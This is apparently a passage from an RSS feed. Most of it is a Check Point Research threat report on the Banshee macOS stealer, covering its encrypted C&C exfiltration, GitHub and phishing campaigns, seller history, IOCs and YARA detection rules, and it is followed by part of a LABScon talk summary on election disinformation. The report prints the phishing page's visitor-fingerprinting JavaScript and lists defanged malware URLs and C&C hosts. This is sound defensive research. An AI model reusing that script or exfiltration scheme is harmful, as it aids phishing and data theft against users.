+&lt;li&gt;XOR encrypted using the campaign ID (&lt;code&gt;BUILD_ID&lt;/code&gt;)&lt;/li&gt;
+
+
+
+&lt;li&gt;Base64 encoded&lt;/li&gt;
+
+
+
+&lt;li&gt;A JSON file named &lt;code&gt;output.json&lt;/code&gt; is created with key &lt;code&gt;data:&lt;/code&gt; and value is the encoded/XORed content of the zipped folder.&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;Finally, the file is sent via a POST HTTP request to the command and control server by executing the curl command &lt;code&gt;-X POST -H "Content-Type: application/json" --data&lt;/code&gt;&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30951" height="520" src="https://research.checkpoint.com/wp-content/uploads/2024/12/004-2.png" width="536" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; C&amp;amp;C decryption.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The initial Banshee stealer command and control servers run the Django framework with bots and threat actors interacting with the same server. On further panel developments, the author introduced a &lt;strong&gt;Staging/Relay Server&lt;/strong&gt; with the &lt;code&gt;urls.py&lt;/code&gt; file responding to two paths:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;code&gt;/api/send&lt;/code&gt; for the Bot-C&amp;amp;C communication&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;code&gt;/admin/login&lt;/code&gt; for the Django admin.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;The stolen data were finally sent to another server where the threat actor/admin was able to retrieve the infection statistics and stolen credentials.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30952" height="513" src="https://research.checkpoint.com/wp-content/uploads/2024/12/005-1.png" width="811" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; Django C&amp;amp;C panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Subsequent campaigns and panel developments rebuilt the Relay Server using FastAPI instead of Django. This shift eliminated the Django-specific &lt;code&gt;/admin/login&lt;/code&gt; path, providing a single option for a POST request at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30953" height="556" src="https://research.checkpoint.com/wp-content/uploads/2024/12/006-1-1024x556.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; FastAPI documentation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Currently, the server hosting the admin panel is &amp;#8220;hidden&amp;#8221; behind the Relay servers, providing a more stealthy method of hosting malicious infrastructure. This setup enhances the stealth of the attack, making it harder to detect and disrupt the underlying infrastructure.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30955" height="553" src="https://research.checkpoint.com/wp-content/uploads/2024/12/007-1-1024x553.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; Banshee login panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h1 class="wp-block-heading"&gt;GitHub Campaigns&lt;/h1&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered multiple repositories distributing this new Banshee Stealer version specifically targeting MacOS users. The phishing repositories often pretend to offer various cracked software, especially for Adobe software or any other image or video editing solutions.&lt;/p&gt;
+
+
+
+&lt;p&gt;This new, undetected version of &lt;strong&gt;Banshee&lt;/strong&gt; was distributed in at least three waves by multiple repositories. The first occurred between October 18 and 21, through nine repositories, each receiving 10 to 30 stars, increasing their appearance as legitimate. A second smaller campaign occurred somewhere around October 31, while the third wave of repositories was discovered around November 3. These waves used roughly the same number of repositories and stargazers as the first waves. In all cases, the network initially created malicious repositories, mostly empty and without any malicious code. Approximately two weeks later, after the repositories matured, the malicious actions began.&lt;/p&gt;
+
+
+
+&lt;p&gt;The &lt;strong&gt;first campaign&lt;/strong&gt; only targeted MacOS users, distributing two files: &lt;code&gt;Software_Installation_Tool.v3.2.zip&lt;/code&gt; which contained &lt;code&gt;Setup_V3.2.dmg (Setup)&lt;/code&gt;, and &lt;code&gt;Setup_V3.0.dmg&lt;/code&gt;, which contained the same file hash, a new version of &lt;strong&gt;Banshee stealer&lt;/strong&gt;. The binary’s campaign ID was &lt;code&gt;7hsaHicTxe25WLb38j6RTPZfJDmkIB&lt;/code&gt;, and the C&amp;amp;C where the threat-actor received the stolen information was &lt;code&gt;hxxp://41[.]216[.]183[.]49/api/send/&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30957" height="726" src="https://research.checkpoint.com/wp-content/uploads/2024/12/008-2-1024x726.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Repositories from first campaign.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;strong&gt;second campaign,&lt;/strong&gt; which was “committed” on October 31, targeted both &lt;strong&gt;Windows&lt;/strong&gt; and &lt;strong&gt;MacOS&lt;/strong&gt; users. The repositories redirect victims to a &lt;code&gt;github.io&lt;/code&gt; post containing two malicious archive links: one for &lt;strong&gt;Windows&lt;/strong&gt; with &lt;strong&gt;Lumma Stealer&lt;/strong&gt; and one for &lt;strong&gt;MacOS&lt;/strong&gt; with &lt;strong&gt;Banshee Stealer&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30958" height="485" src="https://research.checkpoint.com/wp-content/uploads/2024/12/009-1024x485.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 &amp;#8211; Commit updating &lt;code&gt;README&lt;/code&gt; content.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30961" height="702" src="https://research.checkpoint.com/wp-content/uploads/2024/12/010.png" width="554" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; Github.io site.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;These two links download the malicious archives from another repository’s release.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;a href="hxxps://github[.]com/ArvendraChhonkar/todo/releases/download/macosandwindows/Project_v1.2.0.zip" class="download-button"&gt;Download for Windows&amp;lt;/a&gt;
+&amp;lt;a href="hxxps://github[.]com/ArvendraChhonkar/todo/releases/download/macosandwindows/install_setup_v1.2.0.dmg" class="download-button"&gt;Download for macOS&amp;lt;/a&gt;
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The second &lt;strong&gt;Banshee stealer&lt;/strong&gt; campaign ID was &lt;code&gt;K1WDRRD8E2dHM7i2WFSHyN4DKG3v7q&lt;/code&gt;, and the C&amp;amp;C was unchanged. Last time checked (December 10), the repositories still spread malware and remain undetected despite the fact that the &lt;code&gt;.dmg&lt;/code&gt; file is unzipped and not password protected.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30963" height="357" src="https://research.checkpoint.com/wp-content/uploads/2024/12/011-1024x357.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; Malicious release.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;strong&gt;third campaign&lt;/strong&gt; took place around November 3rd and targeted &lt;strong&gt;Windows&lt;/strong&gt; and &lt;strong&gt;MacOS&lt;/strong&gt; users as well. The &lt;strong&gt;Mac&lt;/strong&gt; release &lt;code&gt;Soft.Install.v1.4.zip&lt;/code&gt; contained &lt;code&gt;Installer.dmg (Installer)&lt;/code&gt; which carried the malware. The Bot communicated with the same C&amp;amp;C as the previous campaign but with ID &lt;code&gt;KAriWgOCQrqvyRSnPOnaE6UUBWjELA&lt;/code&gt;. The &lt;strong&gt;Lumma Stealer&lt;/strong&gt; release &lt;code&gt;ExtraModes_v1.6.zip (Setup.exe)&lt;/code&gt; had nine C&amp;amp;C servers with tld &lt;code&gt;.site&lt;/code&gt; , while further endpoints were hosted on Steam. The threat actor behind this campaign uses two stealers in his arsenal: Lumma to target Windows and Banshee to target MacOS.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30964" height="768" src="https://research.checkpoint.com/wp-content/uploads/2024/12/012-1024x768.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; Dual targeting OS campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Almost all repositories were created before they started pushing malware. The releases hosted two archives, one targeting Windows and the other MacOS.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30965" height="395" src="https://research.checkpoint.com/wp-content/uploads/2024/12/013-1024x395.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 &amp;#8211; Repository releases.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h1 class="wp-block-heading"&gt;New Version Campaigns&lt;/h1&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; successfully obtained multiple files from the new version of the &lt;strong&gt;Banshee&lt;/strong&gt; Stealer which introduced string encryption for the first time on September 26th. Since then, we observed over 26 campaigns. Three of them were distributed via GitHub, though there may be more that have yet to be identified. The remaining campaigns appear to use different distribution methods. However, based on the filenames of the obtained files, they still impersonate popular software such as Chrome, TradingView, Zegent, Parallels, Solara, CryptoNews, MediaKIT, and Telegram.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; collected all the samples, extracted the campaigns and the command and control servers, and obtained the file names masquerading as popular software. By generating the node graph below, we can distinguish two major clusters, primarily separated based on the distribution methods. The first major cluster, with C&amp;amp;C &lt;code&gt;41[.]216.183.49&lt;/code&gt;, possibly distributed most of the Banshee stealer campaigns through malicious repositories commonly using filenames such as “Setup”, “Installer” and “Update”. The second cluster consists of multiple linked command and control servers that share the same &amp;#8220;software&amp;#8221; names, maintaining consistency across various campaigns and changes to the command and control servers.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30966" height="611" src="https://research.checkpoint.com/wp-content/uploads/2024/12/014-1024x611.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 &amp;#8211; Campaigns clusters.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;One recent campaign from the second cluster, observed on December 3, impersonates a fake Telegram chat through a phishing website, directing the user to download a file. The website retrieves the User-Agent from the request and, if the machine is MacOS, provides the download link and instructions to install it. When visiting the phishing website with Windows or Linux User-Agents, the malicious download link is not displayed. The malicious file is downloaded from &lt;code&gt;hxxps://api7[.]cfd/testet123t/Telegram.dmg&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30968" height="576" src="https://research.checkpoint.com/wp-content/uploads/2024/12/015-1024x576.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 &amp;#8211; Phishing site targeting MacOS (left) and Windows (Right).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The HTML files &lt;code&gt;index.html&lt;/code&gt; as well as &lt;code&gt;mobile.html&lt;/code&gt; contain no other malicious functionality except to report back via &lt;code&gt;sendNotification.php&lt;/code&gt; to the threat actor that a user visited the phishing page. While &lt;code&gt;mac.html&lt;/code&gt; provides the victim with the malicious link to download Banshee. JavaScript code handling the User-Agent is shown below:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;  &amp;lt;script&gt;
+    document.addEventListener('DOMContentLoaded', function () {
+      async function sendVisitorDetails(isVerifyClick = false) {
+        try {
+          const response = await fetch('&amp;lt;https://ipapi.co/json/&gt;');
+          const data = await response.json();
+
+          const userAgent = navigator.userAgent;
+          let os = 'Unknown';
+          let redirectUrl = null;
+
+          if (/Macintosh/i.test(userAgent) &amp;amp;&amp;amp; !/iPhone|iPad|iPod/i.test(userAgent)) {
+            os = '&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; macOS';
+          } else if (/iPhone|iPad|iPod|Android/i.test(userAgent)) {
+            os = '&lt;img alt="⚠" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/26a0.png" style="height: 1em;" /&gt; Mobile';
+            redirectUrl = 'mobile.html';  
+          } else if (/Windows/i.test(userAgent)) {
+            os = '&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; Windows';
+          }
+
+          const message = isVerifyClick
+            ? ` MacOS user is being shown stealer installation instructions:\\n- OS: ${os}\\n-  Country: ${data.country_name || 'Unknown'}\\n-  IP: ${data.ip || 'Unknown'}`
+            : ` MacOS user redirected to stealer page:\\n- OS: ${os}\\n-  Country: ${data.country_name || 'Unknown'}\\n-  IP: ${data.ip || 'Unknown'}`;
+
+          await fetch('sendNotification.php', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ message: message })
+          });
+
+          if (redirectUrl &amp;amp;&amp;amp; !isVerifyClick) {
+            window.location.href = redirectUrl;
+          }
+
+        } catch (error) {
+          console.error('Failed to send visitor details:', error);
+        }
+      }
+
+      sendVisitorDetails();
+
+      document.querySelectorAll('.verify-trigger').forEach(button =&gt; {
+        button.addEventListener('click', () =&gt; {
+          sendVisitorDetails(true);  
+        });
+      });
+    });
+  &amp;lt;/script&gt;
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;In this case, the threat actor is not performing dual infections on MacOS and Windows users and is clearly only interested in victims using the first one. How a victim arrives at the phishing website is currently unclear; however, users seeking to download cracked or tools from illegitimate sources are the target of such attacks. Similar phishing websites have been found distributing constantly updated &lt;code&gt;.dmg&lt;/code&gt; files, as shown by the URLs and corresponding filenames below:&lt;/p&gt;
+
+
+
+&lt;pre class="wp-block-preformatted"&gt;- Telegram.dmg         hxxp://api7[.]cfd/testet123t/&lt;br /&gt;- TradingView.dmg      hxxps://coincapy[.]com/zx/&lt;br /&gt;- MediaKIT.dmg         hxxps://fotor[.]software/MediaKIT&lt;br /&gt;- Contract.dmg         hxxps://fotor[.]software/MacOS/Collaboration&lt;br /&gt;&lt;/pre&gt;
+
+
+
+&lt;p&gt;Even though the Banshee stealer-as-a-service business has closed, threat actors are still using the updated versions of the service and performing new campaigns targeting MacOS users. It is unclear whether the remaining campaigns originate from previous customers or if the creator of Banshee is continuously updating the source code and using the malware as part of the private group hired in XSS to conduct MacOS campaigns.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Author and Darkweb Forums&lt;/h1&gt;
+
+
+
+&lt;p&gt;On July 18, &lt;code&gt;@kolosain&lt;/code&gt; created a Telegram channel and began selling the Banshee stealer for $2,999. Then, between August 13 and 15, the account &lt;code&gt;@0xe1&lt;/code&gt;, the same actor behind the Telegram channel (&lt;code&gt;@kolosain&lt;/code&gt;), published on XSS and Exploit forums offering the Banshee MacOS stealer as a service to a broader audience for a discounted price of $1,500 per month.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30971" height="787" src="https://research.checkpoint.com/wp-content/uploads/2024/12/016-1024x787.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 &amp;#8211; XSS post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Between August 26 and 28, &lt;code&gt;@0xe1&lt;/code&gt; started recruiting members for a small private group that would operate and perform campaigns. The seller offered the Banshee stealer and support to bypass Antivirus engines, starting with a 50% profit share for affiliates, which later increased to 60-65%. The recruitment was limited to only two spots, and &lt;code&gt;@0xe1&lt;/code&gt; was searching for skilled actors with experience.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30972" height="659" src="https://research.checkpoint.com/wp-content/uploads/2024/12/017-1024x659.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 &amp;#8211; Private group recruitment.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered the first version of Banshee Stealer using this new string encryption algorithm on September 26. Since then, campaigns using the old version have not been observed. On October 17, the author posted on XSS trying to sell the entire project for 1BTC. Soon after, the price dropped to $30.000. The timing suggests that the author may have been aware that the original source code had been leaked and was trying to quickly sell the project to make some quick cash.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30973" height="693" src="https://research.checkpoint.com/wp-content/uploads/2024/12/018-1024x693.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 &amp;#8211; Banshee sale post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Throughout this entire time, from October 10 to November 14, the stealer received updates which can be seen by posts on the Banshee forums.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30974" height="393" src="https://research.checkpoint.com/wp-content/uploads/2024/12/019.jpg" width="1014" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 &amp;#8211; Updates post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;By November 24, the author decided to close the service since the original source code of the Banshee Stealer was &lt;a href="https://github.com/Evi1Grey5/MacOS-S"&gt;leaked&lt;/a&gt; the previous day. Since then, we discovered multiple campaigns mostly distributed through phishing websites. It is unclear if those campaigns are performed by the remaining customers or the author’s private group.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30975" height="784" src="https://research.checkpoint.com/wp-content/uploads/2024/12/020.png" width="953" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 &amp;#8211; Closing business.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Shortly after the code leak, antivirus engines started detecting even the newest versions of Banshee, which included string encryption and new anti-analysis techniques. While this leak may help improve detection, it also poses the risk of creating multiple forks and new versions of Banshee being developed and distributed by different actors.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Conclusion&lt;/h1&gt;
+
+
+
+&lt;p&gt;This relatively small code update of string encryption introduced by the developer of Banshee caused most antivirus engines to fail to detect this dangerous macOS infostealer for over two months. This illustrates the growing trend of threat actors targeting macOS users as well as the expansion of their arsenal and capabilities with malware and tools for different operating systems.&lt;/p&gt;
+
+
+
+&lt;p&gt;Malicious repositories on GitHub which primarily target Windows users, have gradually extended their reach to macOS, Linux, and Android platforms. The surge in infections among Windows users led threat actors to replicate their attack chain for macOS, broadening the scope of the threat across multiple operating systems. While Windows-based malware was often distributed via password-protected archives on GitHub to evade detection, macOS disk image files (DMG) and unprotected archives were openly shared on the platform.&lt;/p&gt;
+
+
+
+&lt;p&gt;Despite macOS traditionally being regarded as more secure, Banshee&amp;#8217;s success demonstrates the importance for macOS users to remain vigilant. It is crucial for security solutions to evolve and provide better protection against increasingly sophisticated attacks as threat actors continue to expand their reach.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Mitigations&lt;/h1&gt;
+
+
+
+&lt;p&gt;Operating systems and applications must be updated with timely patches and other means to mitigate the risks of threats like Banshee Stealer. Individuals should exercise caution when dealing with unexpected emails or messages containing links, particularly from unknown senders. Enhancing cybersecurity awareness among employees is also crucial, as it fosters a vigilant workforce. Lastly, consulting security specialists for any uncertainties can provide valuable expertise and guidance in navigating potential security challenges.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Indicators of Compromise&lt;/h1&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;MacOS archive releases&lt;/td&gt;&lt;td&gt;cdfbcb3d850713c49d451b3e80fb8507f86ba4ad9385e083c2a2bf8d11adc4fb&lt;br /&gt;1dcf3b607d2c9e181643dd6bf1fd85e39d3dc4f95b6992e5a435d0d900333416&lt;br /&gt;d8ecc92571b3bcd935dcab9cdbeda7c2ebda3021dda013920ace35d294db07be&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Banshee MacOS Stealer&lt;/td&gt;&lt;td&gt;00c68fb8bcb44581f15cb4f888b4dec8cd6d528cacb287dc1bdeeb34299b8c93&lt;br /&gt;ce371a92e905d12cb16b5c273429ae91d6ff5485dda04bfedf002d2006856038&lt;br /&gt;d04f71711e7749a4ff193843ae9ce852c581e55eaf29b8eec5b36c4b9c8699c2&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Banshee Command &amp;amp; Control&lt;/td&gt;&lt;td&gt;41[.]216[.]183[.]49&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Lumma Stealer&lt;/td&gt;&lt;td&gt;3bcd41e8da4cf68bb38d9ef97789ec069d393306a5d1ea5846f0c4dc0d5beaab&lt;br /&gt;b978c70331fc81804dea11bf0b334aa324d94a2540a285ba266dd5bbfbcbc114&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Lumma C&amp;amp;C&lt;/td&gt;&lt;td&gt;authorisev[.]site&lt;br /&gt;contemteny[.]site&lt;br /&gt;dilemmadu[.]site&lt;br /&gt;faulteyotk[.]site&lt;br /&gt;forbidstow[.]site&lt;br /&gt;goalyfeastz[.]site&lt;br /&gt;opposezmny[.]site&lt;br /&gt;seallysl[.]site&lt;br /&gt;servicedny[.]site&lt;br /&gt;hxxps://steamcommunity[.]com/profiles/76561199724331900&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Yara Rules&lt;/h1&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;private rule macos_binary
+{
+  meta:
+    author = "Antonis Terefos @Tera0017/@Check Point Research"
+    descr = "MacOS file format"
+  condition:
+     uint32(0) == 0xFEEDFACE or uint32(0) == 0xFEEDFACF or uint32(0) == 0xBEBAFECA
+}
+
+rule banshee_macos
+{
+  meta:
+    author = "Antonis Terefos @Tera0017/@Check Point Research"
+    descr = "Banshee MacOS stealer, encrypted strings version"
+    sha256 = "ce371a92e905d12cb16b5c273429ae91d6ff5485dda04bfedf002d2006856038"
+  strings:
+    // x64 
+    $x64_code_str_decr1 = {80 E1 ?? (48| 49) 89 (DE| F0| FE) (48| 49) D3 (EE| E8) (40| 44) 30 ?? 48 83 C2 08}
+    $x64_code_str_decr12 = {0B 09 7D 92 2B 25 CB 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38}
+    $x64_code_str_decr2 = {48 89 ?? 48 D3 [1-2] 30 ?? 48 83 C1 08 48 FF C?}
+    $x64_code_str_decr3 = {81 30 [4] C6 40 04 00}
+    $x64_code_str_decr4 = {2B 25 C8 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38 08 21 00 91}
+    $x64_code_campid = {88 14 08 8A 54 31 02 48 FF C1 48 83 F9 1D}
+    $x64_code_gen1 = {C6 40 09 00 31 C9 8A 14 08}
+    $x64_code_gen2 = {88 14 31 8A 54 30 02 48 FF C6 84 D2}
+    $x64_code_gen3 = {72 00 77 00 [30] 00 3B 00 00}
+    // Arm
+    $arm_code_str_decr1 = {0B 09 7D 92 2B 25 CB 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38 08 21 00 91}
+    $arm_code_str_decr2 = {2B 25 C8 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38 08 21 00 91}
+    $arm_code_campid = {6C 01 09 8B 0A 69 29 38 8A 05 40 39 29 05 00 91 3F 79 00 F1}
+    $arm_code_gen1 = {1F 24 00 39 08 00 80 D2}
+    $arm_code_gen2 = {72 00 77 00 [30] 00 3B 00 00}
+  condition:
+    macos_binary and 6 of ($x64_code*) or all of ($arm_code*)
+}
+&lt;/pre&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Related Research&lt;/h1&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;a href="https://www.elastic.co/security-labs/beyond-the-wail"&gt;https://www.elastic.co/security-labs/beyond-the-wail&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;a href="https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator"&gt;https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;a href="https://github.com/Evi1Grey5/MacOS-S"&gt;https://github.com/Evi1Grey5/MacOS-S&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;a href="https://www.securityweek.com/source-code-of-3000-a-month-macos-malware-banshee-stealer-leaked/"&gt;https://www.securityweek.com/source-code-of-3000-a-month-macos-malware-banshee-stealer-leaked/&lt;/a&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;a href="https://www.sentinelone.com/blog/from-amos-to-poseidon-a-soc-teams-guide-to-detecting-macos-atomic-stealers-2024/"&gt;https://www.sentinelone.com/blog/from-amos-to-poseidon-a-soc-teams-guide-to-detecting-macos-atomic-stealers-2024/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;Banshee: The Stealer That &amp;#8220;Stole Code&amp;#8221; From MacOS XProtect&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=30935</guid><category>Check Point Research Publications</category></item><item><title>LABScon24 Replay | The Real AI Race: Disinformation in the Taiwanese Election</title><link>https://www.sentinelone.com/labs/labscon24-replay-the-real-ai-race-disinformation-in-the-taiwanese-election/</link><description>Martin Wendiggensen reveals how disinformation shaped Taiwan’s election, and how AI-powered research uncovered hidden influences on voter behavior.</description><content:encoded>&lt;p&gt;AI disinformation, deep fakes, armies of lying bots, and automated deception is the biggest threat to our elections, or so we’ve been told. But looking at Taiwan’s 2024 election, none of these nightmare scenarios materialized. The deafening silence of effective AI disinformation from China, America’s most advanced opponent, was surprising. Even more so given the focus on the election at the highest levels of the Chinese government.&lt;/p&gt;
+&lt;p&gt;In this highly-engaging talk, Martin Wendiggensen details how he set out to study the election and collected tens of thousands of hours of footage from YouTube and television as well as hundreds of thousands of news articles, blog posts, and social media content. This collection was then analyzed with a multi-modal AI pipeline. The results indicated that the small amount of AI-content received no engagement and had no impact.&lt;/p&gt;
+&lt;p&gt;Instead, Taiwanese billionaires earning most of their money in China mounted a concerted effort to buy or set up local news outlets in Taiwan in the run-up to the election. Conducting a large-scale analysis of these outlets’ output uncovered interesting results. Their viewership, numbering in the millions, presented slanted narratives aligned with the Beijing-friendly KMT and a new emergent third party. While losing the presidential election, these two parties managed to wrest control of Taiwan’s parliament and are set to have a major impact on the country’s foreign and domestic policies.&lt;/p&gt;
+&lt;p&gt;This presentation guides the audience through Chinese and local disinformation efforts in the Taiwanese election, highlighting the main lessons that can be drawn from them to safeguard future elections. Along the way, Martin explains the research methodology and toolbox that leverages open-source AI to fight disinformation.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;h2&gt;About the Author&lt;/h2&gt;
+&lt;p&gt;Martin Wendiggensen is a PhD candidate and lecturer at the Alperovitch Institute, focusing on Great Power Competition in Cyberspace, especially competition around AI and state-sponsored information operations. He has conducted research at NATO as well as the University of Mannheim, and applied his knowledge in Artificial Intelligence at his own small startup, which won contracts to monitor electoral environments. Currently, he is conducting research on AI-generated content using Advanced Research Computing at Johns Hopkins SAIS.&lt;/p&gt;
+&lt;h2&gt;About LABScon&lt;/h2&gt;
